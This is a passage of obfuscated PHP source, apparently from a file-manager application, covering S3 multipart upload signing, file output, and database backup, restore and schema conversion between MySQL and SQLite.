hash($ôı©ø§¦[290], $ôı©ø§¦[12]); } } return array($ôı©ø§¦[265] => $×ßÕìûğ[$ôı©ø§¦[265]], $ôı©ø§¦[302] => $ñóÜÜ å, $ôı©ø§¦[255] => $×ßÕìûğ[$ôı©ø§¦[305]]); } return $×ßÕìûğ[$ôı©ø§¦[265]]; } public function listUploadParts($™õ¡ğÏÌ, $Š¸±ò’ = array()) { $ûˆ¸äÊ« =& $_SERVER[£ğ°ÖØø]; $¹ş¨õã = str_replace($ûˆ¸äÊ«[266], $ûˆ¸äÊ«[12], $Š¸±ò’[$ûˆ¸äÊ«[169]]); $¦°¡›‹Ú = $this->client->listParts($this->bucket, $™õ¡ğÏÌ, $¹ş¨õã); if (!$¦°¡›‹Ú) { return !1; } $Ó“™æé = $ûˆ¸äÊ«[306]; foreach ($¦°¡›‹Ú as $ûé“ÊÏå) { $Ó“™æé .= $ûˆ¸äÊ«[307] . "\x3c\x50\x61\162\x74\x4e\x75\x6d\142\x65\x72\76{$ûé“ÊÏå[$ûˆ¸äÊ«[308]]}\74\57\x50\141\x72\164\x4e\x75\155\x62\x65\x72\x3e\xa" . "\x3c\x45\x54\141\147\76{$ûé“ÊÏå[$ûˆ¸äÊ«[309]]}\x3c\x2f\105\124\x61\x67\x3e\12" . $ûˆ¸äÊ«[310]; } $Ó“™æé .= $ûˆ¸äÊ«[311]; $Ìš¹¼ãª = array(); $•â¥ö†— = explode($ûˆ¸äÊ«[210], $this->getHost()); $óÕÓ®ç† = array($ûˆ¸äÊ«[303] => $•â¥ö†—[1], $ûˆ¸äÊ«[246] => $ûˆ¸äÊ«[123], $ûˆ¸äÊ«[292] => strlen($Ó“™æé)); $™ÔõÃµÌ = $ûˆ¸äÊ«[257]; $Ÿ“Àø¹Á = $ûˆ¸äÊ«[8] . $this->pathEncode($™õ¡ğÏÌ) . $Š¸±ò’[$ûˆ¸äÊ«[169]]; $…¢ë×¥´ = $this->client->__getSignatureV4($Ìš¹¼ãª, $óÕÓ®ç†, $™ÔõÃµÌ, $Ÿ“Àø¹Á, $Ó“™æé); return array($ûˆ¸äÊ«[265] => $…¢ë×¥´[$ûˆ¸äÊ«[265]], $ûˆ¸äÊ«[255] => $…¢ë×¥´[$ûˆ¸äÊ«[305]], $ûˆ¸äÊ«[267] => $¦°¡›‹Ú, $ûˆ¸äÊ«[302] => $…¢ë×¥´[$ûˆ¸äÊ«[302]]); } public function link($—ÑÀôÆù, $ï´”‚ş² = array()) { return parent::link($—ÑÀôÆù, $ï´”‚ş²); } public function fileOut($ğ¡Í­úÂ, $¦ÑÂÏÄ = false, $ Æ¤ˆæ² = false, $´óéñ²„ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[£ğ°ÖØø][312])) { return parent::fileOutServer($ğ¡Í­úÂ, $¦ÑÂÏÄ, $ Æ¤ˆæ², $´óéñ²„); } parent::fileOut($ğ¡Í­úÂ, $¦ÑÂÏÄ, $ Æ¤ˆæ², $´óéñ²„); } public function fileOutImage($¦î êÙó, $•íÚ¢ú³ = 250) { if (strstr($this->endpoint, $_SERVER[£ğ°ÖØø][312])) { return parent::fileOutImageServer($¦î êÙó, $•íÚ¢ú³); } parent::fileOutImage($¦î êÙó, $•íÚ¢ú³); } public function fileOutLink($››Ã§ÑÀ) { $ÅÂ¦áó· =& $_SERVER[£ğ°ÖØø]; if (substr($››Ã§ÑÀ, 0, 7) == $ÅÂ¦áó·[313]) { $››Ã§ÑÀ = $ÅÂ¦áó·[314] . substr($››Ã§ÑÀ, 7); } header($ÅÂ¦áó·[175] . $››Ã§ÑÀ); die; } } define($_SERVER[£ğ°ÖØø][315], 1); define($_SERVER[£ğ°ÖØø][316], 2); goto Fâô¯ÉËİ³; e¬Å§ÍùÌñ: class DbManage { function __construct($€¦úæù = array()) { $ÊÙ×ºİÆ =& $_SERVER[£ğ°ÖØø]; if (empty($€¦úæù)) { $€¦úæù = $GLOBALS[$ÊÙ×ºİÆ[6]][$ÊÙ×ºİÆ[21]]; } $this->database = $€¦úæù; } public function model($ş’­¡—º = '') { return new ModelBase($ş’­¡—º, $_SERVER[£ğ°ÖØø][12], $this->database); } public function db($¢È‰¤ ‹ = false) { $«ñ£ƒÀù =& $_SERVER[£ğ°ÖØø]; $¶½ù½•¹ = array_change_key_case($this->database); if ($this->dbType() == $«ñ£ƒÀù[13] || !$¢È‰¤ ‹) { return $this->model()->db(); } $ç–˜Õı = $¶½ù½•¹[$«ñ£ƒÀù[1033]]; $¶½ù½•¹[$«ñ£ƒÀù[1033]] = $«ñ£ƒÀù[12]; if ($¶½ù½•¹[$«ñ£ƒÀù[1028]] == $«ñ£ƒÀù[1025]) { $¬°¥Î‘ = $¶½ù½•¹[$«ñ£ƒÀù[1034]]; $¶½ù½•¹[$«ñ£ƒÀù[1034]] = substr($¬°¥Î‘, 0, strrpos($¬°¥Î‘, $«ñ£ƒÀù[1120])); } $this->database = $¶½ù½•¹; $É“£˜Ï¯ = $this->model()->db(); try { $û—ˆ¢Ã = $É“£˜Ï¯->execute("\163\150\157\167\40\144\141\164\x61\x62\141\x73\145\163\40\154\x69\x6b\145\x20\x27{$ç–˜Õı}\x27"); } catch (Exception $Ä‚Ş´×š) { } if (!$û—ˆ¢Ã) { $É“£˜Ï¯->execute("\x63\x72\145\x61\164\x65\40\144\141\164\x61\x62\141\163\145\40\x60{$ç–˜Õı}\x60"); } $¶½ù½•¹[$«ñ£ƒÀù[1033]] = $ç–˜Õı; if ($¶½ù½•¹[$«ñ£ƒÀù[1028]] == $«ñ£ƒÀù[1025]) { $¶½ù½•¹[$«ñ£ƒÀù[1034]] .= $«ñ£ƒÀù[1120] . $ç–˜Õı; } $this->database = $¶½ù½•¹; $É“£˜Ï¯->execute("\x75\163\x65\40\140{$ç–˜Õı}\x60"); return $É“£˜Ï¯; } public function createTable($œé«¹†, &$ÚÔÎà½×) { $ä…æÛô =& $_SERVER[£ğ°ÖØø]; if (!IO::exist($œé«¹†)) { ActionCall($ä…æÛô[1121], !0, 0); show_json(LNG($ä…æÛô[1122]), !1); } $Ô÷°²Ù¼ = $this->model()->db(); $¸º©Æ¬ = sqlSplit(IO::getContent($œé«¹†)); foreach ($¸º©Æ¬ as $¸œÕµ¸Ş) { $ü‡«áş = stripos($¸œÕµ¸Ş, $ä…æÛô[1123]) === 0; if ($ü‡«áş) { $ÚÔÎà½×->task[$ä…æÛô[1124]] += 1; } $Ô÷°²Ù¼->execute($¸œÕµ¸Ş); if ($ü‡«áş) { preg_match($ä…æÛô[1125], $¸œÕµ¸Ş, $¾Šòó ú); $ÚÔÎà½×->task[$ä…æÛô[1126]] = $¾Šòó ú[1]; $ÚÔÎà½×->update(1); } } } public function insertTable($Ç¦ÎÍ–, &$€âŠ²¥î) { $£Íˆªò„ =& $_SERVER[£ğ°ÖØø]; $ŠÉäÔö˜ = $this->model()->db(); $»œœß‡Ã = $•°±Õ˜® ? array($•°±Õ˜®) : $ŠÉäÔö˜->getTables(); foreach ($Ç¦ÎÍ– as $ô¾’ÜÅ“) { $•°±Õ˜® = basename($ô¾’ÜÅ“, $£Íˆªò„[852]); if (!in_array($•°±Õ˜®, $»œœß‡Ã)) { continue; } $€âŠ²¥î->task[$£Íˆªò„[1126]] = $•°±Õ˜®; if (get_filesize($ô¾’ÜÅ“) == 0) { continue; } $ï€öÍŒÌ = $this->sqlToDb($ô¾’ÜÅ“, $€âŠ²¥î); if (!$ï€öÍŒÌ) { ActionCall($£Íˆªò„[1121], !0, 0); show_json(LNG($£Íˆªò„[1127]) . "\x5b{$•°±Õ˜®}\135", !1); } } } public function sqlFromDb($Â•âŞã, $›Í¶¼š, &$¢·²±¨, $ŸÁ‡½‰÷ = '') { if ($¢·²±¨) { $¢·²±¨->task[$_SERVER[£ğ°ÖØø][1126]] = $Â•âŞã; } $¥ø½íöä = $this->model($Â•âŞã); $¡ªµóˆ = 0; $êò¨ß¤Ù = 0; $‰ã„Úü = 10000; $âèÕı…ı = fopen($›Í¶¼š, $_SERVER[£ğ°ÖØø][1128]); $‘¼§éİõ = $¥ø½íöä->getPk(); $»€ÕãåŞ = $¥ø½íöä->getDbFields(); $Ã²Ş¨Ìô = $_SERVER[£ğ°ÖØø][12]; if ($GLOBALS[$_SERVER[£ğ°ÖØø][851]] && in_array($Â•âŞã, array($_SERVER[£ğ°ÖØø][1129], $_SERVER[£ğ°ÖØø][1130]))) { $Ã²Ş¨Ìô = $Â•âŞã; } do { $ÓµâŞŞÌ = array($‘¼§éİõ => array($_SERVER[£ğ°ÖØø][1075], $êò¨ß¤Ù)); $”Ôşº¨ = $¥ø½íöä->where($ÓµâŞŞÌ)->field($»€ÕãåŞ)->order($‘¼§éİõ . $_SERVER[£ğ°ÖØø][1131])->limit($‰ã„Úü)->select(); $”Ôşº¨ = !empty($”Ôşº¨) ? $”Ôşº¨ : array(); if (!($—Ç´ïÏë = count($”Ôşº¨))) { break; } $æÏ–µê = end($”Ôşº¨); $êò¨ß¤Ù = $æÏ–µê[$‘¼§éİõ]; $±Œüé = array(); foreach ($”Ôşº¨ as $ëüŞ¸‚µ) { if ($Ã²Ş¨Ìô) { if ($Â•âŞã == $_SERVER[£ğ°ÖØø][1129]) { if ($ëüŞ¸‚µ[$_SERVER[£ğ°ÖØø][33]] == $_SERVER[£ğ°ÖØø][1132]) { $Âø Õø´ = json_decode($ëüŞ¸‚µ[$_SERVER[£ğ°ÖØø][459]], !0); if ($Âø Õø´[$_SERVER[£ğ°ÖØø][32]] == $GLOBALS[$_SERVER[£ğ°ÖØø][851]] && $Âø Õø´[$_SERVER[£ğ°ÖØø][814]] != 1) { continue; } } } else { if ($ëüŞ¸‚µ[$_SERVER[£ğ°ÖØø][33]] == $_SERVER[£ğ°ÖØø][1133] && $ëüŞ¸‚µ[$_SERVER[£ğ°ÖØø][97]] == $_SERVER[£ğ°ÖØø][846]) { continue; } } } if ($ŸÁ‡½‰÷) { $ëüŞ¸‚µ[$_SERVER[£ğ°ÖØø][87]] = "\x7b\x69\157\x3a{$ŸÁ‡½‰÷}\175" . substr($ëüŞ¸‚µ[$_SERVER[£ğ°ÖØø][87]], strlen("\x7b\x69\157\72{$ëüŞ¸‚µ[$_SERVER[£ğ°ÖØø][881]]}\x7d")); $ëüŞ¸‚µ[$_SERVER[£ğ°ÖØø][881]] = $ŸÁ‡½‰÷; } $±Œüé[] = $_SERVER[£ğ°ÖØø][1134] . $this->sqlEncode($ëüŞ¸‚µ) . $_SERVER[£ğ°ÖØø][1135]; } $¬Óë¹ïé = "\111\116\123\x45\x52\x54\x20\x49\116\124\117\40\x60{$Â•âŞã}\140\x20\x28\140" . implode($_SERVER[£ğ°ÖØø][1136], $»€ÕãåŞ) . $_SERVER[£ğ°ÖØø][1137]; fwrite($âèÕı…ı, $¬Óë¹ïé . implode($_SERVER[£ğ°ÖØø][1138], $±Œüé) . $_SERVER[£ğ°ÖØø][74] . PHP_EOL); $¡ªµóˆ += $—Ç´ïÏë; if ($¢·²±¨) { $¢·²±¨->update($—Ç´ïÏë); } } while ($‰ã„Úü == $—Ç´ïÏë); fclose($âèÕı…ı); return $¡ªµóˆ; } public function sqlToDb($øÛÚêÓÕ, &$ş®“Œ÷Ø) { $ôÑÅû =& $_SERVER[£ğ°ÖØø]; $Ùê™‡½ = $this->model()->db(); $şµí”¦ = @fopen($øÛÚêÓÕ, $ôÑÅû[1139]); if (!$şµí”¦) { return !1; } $¤¡ÎãâÁ = 0; $š½ãšª… = $ôÑÅû[12]; $Á»¿ÍÔö = array(); $ü¯È‘è = $this->dbType(); $¯¥¶¼Ø± = $ü¯È‘è == $ôÑÅû[13] ? 500 : 2000; $ışÉÂÔ¦ = basename($øÛÚêÓÕ, $ôÑÅû[852]); $ü­èˆŒ” = 0; $‚«şŠ¥Ä = 4194304; while (!feof($şµí”¦)) { $Ğ¥‡«À = trim(fgets($şµí”¦)); if (!$Ğ¥‡«À) { continue; } $öåÒô¨¼ = $this->sqlDecode($Ğ¥‡«À, $ü¯È‘è, $ışÉÂÔ¦); if (stripos($öåÒô¨¼, $ôÑÅû[440]) === 0) { if (!$š½ãšª…) { $š½ãšª… = $öåÒô¨¼ . $ôÑÅû[53]; } continue; } if ($ş®“Œ÷Ø) { $ş®“Œ÷Ø->task[$ôÑÅû[1124]] += 1; } $¤¡ÎãâÁ++; $Á»¿ÍÔö[] = rtrim(rtrim(trim($öåÒô¨¼), $ôÑÅû[50]), $ôÑÅû[74]); $²²½ü¶ = null; $Ïû¨áú£ = strlen($öåÒô¨¼); $ü­èˆŒ” += $Ïû¨áú£; $ŠşÀšĞ = strlen($š½ãšª…) + $ü­èˆŒ” + (count($Á»¿ÍÔö) - 1); if ($ŠşÀšĞ >= $‚«şŠ¥Ä) { $²²½ü¶ = array_pop($Á»¿ÍÔö); if ($¤¡ÎãâÁ > 1) { $¤¡ÎãâÁ--; } } if ($¤¡ÎãâÁ >= $¯¥¶¼Ø± || $²²½ü¶) { $öåÒô¨¼ = $š½ãšª… . implode($ôÑÅû[50], $Á»¿ÍÔö); if (!$Ùê™‡½->execute($öåÒô¨¼)) { return !1; } if ($ş®“Œ÷Ø) { $ş®“Œ÷Ø->update($¤¡ÎãâÁ); } $Á»¿ÍÔö = array(); $¤¡ÎãâÁ = 0; $ü­èˆŒ” = 0; if ($²²½ü¶) { $Á»¿ÍÔö = array($²²½ü¶); $¤¡ÎãâÁ = 1; $ü­èˆŒ” = $Ïû¨áú£; } } } fclose($şµí”¦); if (!empty($Á»¿ÍÔö)) { $öåÒô¨¼ = $š½ãšª… . implode($ôÑÅû[50], $Á»¿ÍÔö); if (!$Ùê™‡½->execute($öåÒô¨¼)) { return !1; } if ($ş®“Œ÷Ø) { $ş®“Œ÷Ø->update($¤¡ÎãâÁ); } } return !0; } public function dropTable($–»ğ—– = null) { $è­¯ì³ø = $this->model()->db(); $Œ´ğÖèË = $–»ğ—– ? array($–»ğ—–) : $è­¯ì³ø->getTables(); if (!$Œ´ğÖèË) { return; } foreach ($Œ´ğÖèË as $–»ğ—–) { if ($–»ğ—–) { $–»ğ—– = strtolower($–»ğ—–); } else { continue; } $è­¯ì³ø->execute("\x64\x72\x6f\x70\40\x74\x61\142\154\145\40\151\146\40\145\x78\x69\163\x74\x73\40\140{$–»ğ—–}\140"); } } private function sqlEncode($¡°ñÓ¹) { $Ê‹™ì” =& $_SERVER[£ğ°ÖØø]; $®öèğŸˆ = array(); foreach ($¡°ñÓ¹ as $ÚÜåîÜÆ) { if (is_array($ÚÜåîÜÆ)) { $ÚÜåîÜÆ = json_encode_force($ÚÜåîÜÆ); } $ÚÜåîÜÆ = addslashes($ÚÜåîÜÆ); $ÚÜåîÜÆ = str_replace(array($Ê‹™ì”[1140], $Ê‹™ì”[262], $Ê‹™ì”[418]), array($Ê‹™ì”[1141], $Ê‹™ì”[1142], $Ê‹™ì”[1143]), $ÚÜåîÜÆ); $®öèğŸˆ[] = $ÚÜåîÜÆ; } return $Ê‹™ì”[58] . implode($Ê‹™ì”[1144], $®öèğŸˆ) . $Ê‹™ì”[58]; } private function sqlDecode($¦«¸˜, $Æ™ƒâ¬Î, $ıŸŸ…Åì = '') { $ïÂÌõÂ¾ =& $_SERVER[£ğ°ÖØø]; $¦«¸˜ = str_replace(array($ïÂÌõÂ¾[1141], $ïÂÌõÂ¾[1142], $ïÂÌõÂ¾[1143]), array($ïÂÌõÂ¾[1140], $ïÂÌõÂ¾[262], $ïÂÌõÂ¾[418]), $¦«¸˜); if ($Æ™ƒâ¬Î == $ïÂÌõÂ¾[13]) { $¦«¸˜ = str_ireplace($ïÂÌõÂ¾[1145], $ïÂÌõÂ¾[59], $¦«¸˜); $¦«¸˜ = stripslashes($¦«¸˜); } return preg_replace($ïÂÌõÂ¾[1146], $ïÂÌõÂ¾[12], $¦«¸˜); if ($Æ™ƒâ¬Î == $ïÂÌõÂ¾[13]) { return $ıŸŸ…Åì != $ïÂÌõÂ¾[1147] ? stripslashes($¦«¸˜) : $¦«¸˜; } if ($ıŸŸ…Åì == $ïÂÌõÂ¾[1147]) { $¦«¸˜ = str_replace($ïÂÌõÂ¾[1148], $ïÂÌõÂ¾[121], stripslashes($¦«¸˜)); } return $¦«¸˜; } public function getSqlFile($ûÁ‹èË = '') { $ÌœÕù…» =& $_SERVER[£ğ°ÖØø]; $”¨“û°× = $this->dbType(!0); $¤´´úé = CONTROLLER_DIR . "\x69\x6e\x73\164\141\x6c\x6c\x2f\x64\x61\x74\141\57{$”¨“û°×}\x2e\163\161\154"; $ÀÀëƒÓ‚ = file_get_contents($¤´´úé); $áéó«Û = $ÌœÕù…»[1149] . ($”¨“û°× == $ÌœÕù…»[868] ? $ÌœÕù…»[1150] : $ÌœÕù…»[1151]) . $ÌœÕù…»[1152]; preg_match_all($áéó«Û, $ÀÀëƒÓ‚, $Üñ±í»¹); $¾î §ûî = $Üñ±í»¹[1]; $ä¸×ú¦Ó = $this->model()->db(); $…ùÊˆÍ¾ = $ä¸×ú¦Ó->getTables(); $Å‰ùı„ = TEMP_FILES . $ÌœÕù…»[1153] . date($ÌœÕù…»[272]) . $ÌœÕù…»[8]; del_dir($Å‰ùı„); mk_dir($Å‰ùı„); $ˆö¾Æ¡ = $Å‰ùı„ . $ÌœÕù…»[1154]; $©¦³¥˜« = $Å‰ùı„ . $ÌœÕù…»[1155]; $ö¬Š§Ò¡ = $”¨“û°× == $ÌœÕù…»[13] ? $ÌœÕù…»[868] : $ÌœÕù…»[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\164\141\154\154\x2f\x64\141\164\x61\57{$ö¬Š§Ò¡}\x2e\x73\161\154", $Å‰ùı„); @touch($Å‰ùı„ . $”¨“û°× . $ÌœÕù…»[852]); $‘Ôı‘ÄÊ = fopen($ˆö¾Æ¡, $ÌœÕù…»[1128]); $ûØÂó¸™ = fopen($©¦³¥˜«, $ÌœÕù…»[1128]); if ($”¨“û°× == $ÌœÕù…»[13]) { $…ùÊˆÍ¾ = array_diff($…ùÊˆÍ¾, array($ÌœÕù…»[844], $ÌœÕù…»[845])); $¦­½áÆ = array($ÌœÕù…»[1156], $ÌœÕù…»[1157], $ÌœÕù…»[1158]); fwrite($ûØÂó¸™, implode(PHP_EOL, $¦­½áÆ) . PHP_EOL . PHP_EOL); foreach ($…ùÊˆÍ¾ as $Ô‘áÕá­) { $ì‘áêÙ = $this->sqlFromSqlite($Ô‘áÕá­); if (!$ì‘áêÙ[$ÌœÕù…»[13]]) { continue; } fwrite($ûØÂó¸™, $ì‘áêÙ[$ÌœÕù…»[13]] . PHP_EOL . PHP_EOL); if (!in_array($Ô‘áÕá­, $¾î §ûî)) { fwrite($‘Ôı‘ÄÊ, $ì‘áêÙ[$ÌœÕù…»[868]] . PHP_EOL . PHP_EOL); } } } else { foreach ($…ùÊˆÍ¾ as $Ô‘áÕá­) { $ì‘áêÙ = $this->sqlFromMysql($Ô‘áÕá­); if (!$ì‘áêÙ[$ÌœÕù…»[868]]) { continue; } fwrite($‘Ôı‘ÄÊ, $ì‘áêÙ[$ÌœÕù…»[868]] . PHP_EOL . PHP_EOL); if (!in_array($Ô‘áÕá­, $¾î §ûî)) { fwrite($ûØÂó¸™, $ì‘áêÙ[$ÌœÕù…»[13]] . PHP_EOL . PHP_EOL); } } } fclose($‘Ôı‘ÄÊ); fclose($ûØÂó¸™); $ÀÀëƒÓ‚ = array($ÌœÕù…»[868] => $ˆö¾Æ¡, $ÌœÕù…»[13] => $©¦³¥˜«); return $ûÁ‹èË ? $ÀÀëƒÓ‚[$ûÁ‹èË] : $ÀÀëƒÓ‚; } public function dbType($ªş“²úÏ = false) { $íâŸ’˜Â =& $_SERVER[£ğ°ÖØø]; $›Øëï‹Š = $ªş“²úÏ ? $GLOBALS[$íâŸ’˜Â[6]][$íâŸ’˜Â[21]] : $this->database; $›Øëï‹Š = array_change_key_case($›Øëï‹Š); $ÑşÛ´Ç = $›Øëï‹Š[$íâŸ’˜Â[1028]]; if ($ÑşÛ´Ç == $íâŸ’˜Â[1025]) { $ıÂœ‹¶² = explode($íâŸ’˜Â[4], $›Øëï‹Š[$íâŸ’˜Â[1034]]); $ÑşÛ´Ç = $ıÂœ‹¶²[0]; } $ü¡æÌ¡¹ = array($íâŸ’˜Â[1159] => $íâŸ’˜Â[13], $íâŸ’˜Â[973] => $íâŸ’˜Â[868]); if (isset($ü¡æÌ¡¹[$ÑşÛ´Ç])) { $ÑşÛ´Ç = $ü¡æÌ¡¹[$ÑşÛ´Ç]; } return $ÑşÛ´Ç; } public function sqlFromMysql($²³¨îË, $•òˆîÉ‚ = '') { $€¤ÅÓÛÔ =& $_SERVER[£ğ°ÖØø]; $«†«ª« = $this->model()->db(); $È‡ÏÔŸÕ = $«†«ª«->query($€¤ÅÓÛÔ[1160] . $²³¨îË . $€¤ÅÓÛÔ[470]); if (!$È‡ÏÔŸÕ || !$È‡ÏÔŸÕ[0]) { return !1; } $îÑµ£¦ = _get($È‡ÏÔŸÕ[0], $€¤ÅÓÛÔ[1161], $€¤ÅÓÛÔ[12]); if (!$îÑµ£¦) { return !1; } $Ö é´ÒÅ = "\104\x52\117\120\x20\x54\x41\102\114\x45\40\x49\x46\40\105\x58\111\x53\124\x53\40\x60{$²³¨îË}\140\73" . PHP_EOL . $îÑµ£¦ . $€¤ÅÓÛÔ[74]; if ($•òˆîÉ‚ && $•òˆîÉ‚ == $€¤ÅÓÛÔ[868]) { return $Ö é´ÒÅ; } $åÚÛú·æ = array_change_key_case($GLOBALS[$€¤ÅÓÛÔ[6]][$€¤ÅÓÛÔ[21]]); $±›ç¯¢ = $åÚÛú·æ[$€¤ÅÓÛÔ[1033]]; $£Ë—¸¸† = $€¤ÅÓÛÔ[1162] . $±›ç¯¢ . $€¤ÅÓÛÔ[1163] . $²³¨îË . $€¤ÅÓÛÔ[58]; $¸ªÎ¥õ = $€¤ÅÓÛÔ[1164] . $²³¨îË . $€¤ÅÓÛÔ[961]; $ª§ğÜ = $«†«ª«->query($£Ë—¸¸†); if (empty($ª§ğÜ)) { $Âà˜ªï¤ = array($€¤ÅÓÛÔ[868] => $€¤ÅÓÛÔ[12], $€¤ÅÓÛÔ[13] => $€¤ÅÓÛÔ[12]); return $•òˆîÉ‚ ? $Âà˜ªï¤[$•òˆîÉ‚] : $Âà˜ªï¤; } $Ë³á¤âŠ = $«†«ª«->query($¸ªÎ¥õ); $Ğş™ÃÒÃ = $€¤ÅÓÛÔ[12]; $Ç‘Àë¾İ = array(); foreach ($Ë³á¤âŠ as $ Ùà—ëÆ) { if (!$Ğş™ÃÒÃ && $ Ùà—ëÆ[$€¤ÅÓÛÔ[1165]] == $€¤ÅÓÛÔ[1166]) { $Ğş™ÃÒÃ = $ Ùà—ëÆ[$€¤ÅÓÛÔ[1167]]; } if (isset($Ç‘Àë¾İ[$ Ùà—ëÆ[$€¤ÅÓÛÔ[1165]]])) { $Ç‘Àë¾İ[$ Ùà—ëÆ[$€¤ÅÓÛÔ[1165]]][$€¤ÅÓÛÔ[1168]][] = $ Ùà—ëÆ[$€¤ÅÓÛÔ[1167]]; continue; } $Ç‘Àë¾İ[$ Ùà—ëÆ[$€¤ÅÓÛÔ[1165]]] = array($€¤ÅÓÛÔ[1169] => $ Ùà—ëÆ[$€¤ÅÓÛÔ[1165]], $€¤ÅÓÛÔ[1168] => array($ Ùà—ëÆ[$€¤ÅÓÛÔ[1167]]), $€¤ÅÓÛÔ[1170] => $ Ùà—ëÆ[$€¤ÅÓÛÔ[1171]] == $€¤ÅÓÛÔ[91] ? 0 : 1); } $ŠÉôÃ‰ó = array(); foreach ($Ç‘Àë¾İ as $ Ùà—ëÆ) { $À„‘ÎÊ¸ = $ Ùà—ëÆ[$€¤ÅÓÛÔ[1169]] == $€¤ÅÓÛÔ[1166]; $úĞ¤šìá = array($€¤ÅÓÛÔ[1172], $ Ùà—ëÆ[$€¤ÅÓÛÔ[1170]] == $€¤ÅÓÛÔ[91] && !$À„‘ÎÊ¸ ? $€¤ÅÓÛÔ[1173] : $€¤ÅÓÛÔ[12], $€¤ÅÓÛÔ[1174], $€¤ÅÓÛÔ[1175] . $²³¨îË . $€¤ÅÓÛÔ[11] . ($À„‘ÎÊ¸ ? $€¤ÅÓÛÔ[1176] : $ Ùà—ëÆ[$€¤ÅÓÛÔ[1169]]) . $€¤ÅÓÛÔ[121], $€¤ÅÓÛÔ[1177], $€¤ÅÓÛÔ[121] . $²³¨îË . $€¤ÅÓÛÔ[121], $€¤ÅÓÛÔ[1178] . implode($€¤ÅÓÛÔ[1179], $ Ùà—ëÆ[$€¤ÅÓÛÔ[1168]]) . $€¤ÅÓÛÔ[1180]); $ŠÉôÃ‰ó[] = implode($€¤ÅÓÛÔ[53], $úĞ¤šìá) . $€¤ÅÓÛÔ[74]; } $Û†ÁÑßö = array(); $Çô¼›Ç¿ = array($€¤ÅÓÛÔ[1181] => $€¤ÅÓÛÔ[1182], $€¤ÅÓÛÔ[1182] => $€¤ÅÓÛÔ[1182], $€¤ÅÓÛÔ[364] => $€¤ÅÓÛÔ[391], $€¤ÅÓÛÔ[363] => $€¤ÅÓÛÔ[391]); foreach ($ª§ğÜ as $ Ùà—ëÆ) { $úĞ¤šìá = array($€¤ÅÓÛÔ[121] . $ Ùà—ëÆ[$€¤ÅÓÛÔ[1183]] . $€¤ÅÓÛÔ[121], isset($Çô¼›Ç¿[$ Ùà—ëÆ[$€¤ÅÓÛÔ[1184]]]) ? $Çô¼›Ç¿[$ Ùà—ëÆ[$€¤ÅÓÛÔ[1184]]] : $ Ùà—ëÆ[$€¤ÅÓÛÔ[1185]], $ Ùà—ëÆ[$€¤ÅÓÛÔ[1186]] == $€¤ÅÓÛÔ[959] ? $€¤ÅÓÛÔ[1187] : $€¤ÅÓÛÔ[1188], $ Ùà—ëÆ[$€¤ÅÓÛÔ[1183]] == $Ğş™ÃÒÃ ? $€¤ÅÓÛÔ[1189] : $€¤ÅÓÛÔ[12], $ Ùà—ëÆ[$€¤ÅÓÛÔ[1010]] ? strtoupper(str_replace($€¤ÅÓÛÔ[11], $€¤ÅÓÛÔ[12], $ Ùà—ëÆ[$€¤ÅÓÛÔ[1010]])) : $€¤ÅÓÛÔ[12]); $Û†ÁÑßö[] = trim(implode($€¤ÅÓÛÔ[53], $úĞ¤šìá)); } $Å¤Ô‰ÎÁ = array($€¤ÅÓÛÔ[1190] . $²³¨îË . $€¤ÅÓÛÔ[1191], $€¤ÅÓÛÔ[1192] . $²³¨îË . $€¤ÅÓÛÔ[1193], implode($€¤ÅÓÛÔ[50] . PHP_EOL, $Û†ÁÑßö), $€¤ÅÓÛÔ[1007]); $“ÏˆÀ® = implode(PHP_EOL, array_merge($Å¤Ô‰ÎÁ, $ŠÉôÃ‰ó)); if ($•òˆîÉ‚ && $•òˆîÉ‚ == $€¤ÅÓÛÔ[13]) { return $“ÏˆÀ®; } $Âà˜ªï¤ = array($€¤ÅÓÛÔ[868] => $Ö é´ÒÅ, $€¤ÅÓÛÔ[13] => $“ÏˆÀ®); return $•òˆîÉ‚ ? $Âà˜ªï¤[$•òˆîÉ‚] : $Âà˜ªï¤; } public function sqlFromSqlite($‘Ê´Ú¢, $Èû«©©… = '') { $·æ°Ò‚ =& $_SERVER[£ğ°ÖØø]; $š‡ıàŸ = $this->model()->db(); $áî‡¹˜¸ = "\120\x52\101\x47\x4d\101\40\124\x41\x42\x4c\x45\x5f\111\x4e\x46\x4f\x20\50\47{$‘Ê´Ú¢}\x27\51"; $¾¸Ö¬å§ = "\123\x45\114\x45\x43\x54\40\52\40\106\122\117\x4d\40\x73\x71\x6c\151\164\x65\x5f\x6d\x61\163\x74\145\162\40\x57\110\105\122\105\x20\164\x62\x6c\137\156\x61\155\x65\40\x3d\x20\47{$‘Ê´Ú¢}\47"; $šÏàÖ = $š‡ıàŸ->query($áî‡¹˜¸); if (empty($šÏàÖ)) { $Ï¯ÒÃÕë = array($·æ°Ò‚[868] => $·æ°Ò‚[12], $·æ°Ò‚[13] => $·æ°Ò‚[12]); return $Èû«©©… ? $Ï¯ÒÃÕë[$Èû«©©…] : $Ï¯ÒÃÕë; } $ Ïº¸ŠØ = $š‡ıàŸ->query($¾¸Ö¬å§); $àìšÅ¸ = $Ÿ¾¸ÈÅ = array(); foreach ($ Ïº¸ŠØ as $‰éÊÚˆ) { if ($‰éÊÚˆ[$·æ°Ò‚[33]] == $·æ°Ò‚[356]) { $àìšÅ¸[] = $‰éÊÚˆ[$·æ°Ò‚[1194]]; } else { $Ÿ¾¸ÈÅ[$‰éÊÚˆ[$·æ°Ò‚[32]]] = $‰éÊÚˆ[$·æ°Ò‚[1194]]; } } $¶Ş±îîæ = array_merge(array($·æ°Ò‚[1190] . $‘Ê´Ú¢ . $·æ°Ò‚[121]), $àìšÅ¸, array_values($Ÿ¾¸ÈÅ)); $¶Ş±îîæ = implode($·æ°Ò‚[74] . PHP_EOL, $¶Ş±îîæ) . $·æ°Ò‚[74]; if ($Èû«©©… && $Èû«©©… == $·æ°Ò‚[13]) { return $¶Ş±îîæ; } $şÒóÌ®ò = array(); $üèà±‡ = array($·æ°Ò‚[1182] => $·æ°Ò‚[1195], $·æ°Ò‚[391] => $·æ°Ò‚[1196]); $‘½â”† = $·æ°Ò‚[12]; foreach ($šÏàÖ as $‰éÊÚˆ) { if ($‰éÊÚˆ[$·æ°Ò‚[57]] == $·æ°Ò‚[91]) { $‘½â”† = $‰éÊÚˆ[$·æ°Ò‚[32]]; } $Àı†Àó¬ = array($·æ°Ò‚[470] . $‰éÊÚˆ[$·æ°Ò‚[32]] . $·æ°Ò‚[470], isset($üèà±‡[$‰éÊÚˆ[$·æ°Ò‚[33]]]) ? 